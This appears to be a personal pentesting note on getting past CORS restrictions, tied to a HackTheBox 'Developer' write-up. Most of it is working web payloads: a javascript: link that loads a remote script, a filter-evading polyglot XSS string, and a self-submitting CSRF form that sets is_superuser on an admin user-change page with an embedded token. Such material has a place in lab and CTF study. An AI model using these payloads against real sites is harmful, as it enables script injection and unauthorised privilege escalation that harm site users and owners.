# Access-Control-Allow-Origin 

Sites will disallow Javascript requests (post / get) to other sites where no or only specific Access-Control-Allow-Origin Header is set.
We need at least a Header with 
```http
Access-Control-Allow-Origin: *
```


or we need a way to bypass this, the best way would be an xss (for example direct in the link)

```html
<a href="javascript:(onclick=document.write('<script src=http://localhost/sec.js></script>'))">click_me</a>
```


Bypass Filters.

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=document.write('<script src=http://localhost/sec.js></script>') )//
```

see box: [[../../WriteUps/HackTheBox/Developer/WriteUp]]

another way is to use a HTML Forms, this will not blocked by CORS because the user will be redirected to the site

```HTML
<form action="http://developer.htb/admin/auth/user/2/change/" method="POST" id="test">
		
	<div>
		<input type="text" name="is_superuser" value="on">
		<input type="text" name="name" value="sec77">
		<input type="text" name="csrfmiddlewaretoken" value="gVamrrFZREf10Uw3ZCpwfscKs4AumPKSTh2F22mOeG85QMq5DGTd5u3txlPY8HyK">
		<input type="text" name="date_joined_0" value="2021-10-28">
		<input type="text" name="date_joined_1" value="22:06:03">
		<input type="text" name="_save" value="Save">
	  </div>
	
	<div>
		  <button>Send my greetings</button>
		</div>
	  </form>

<script>
document.getElementById("test").submit();
</script>
```

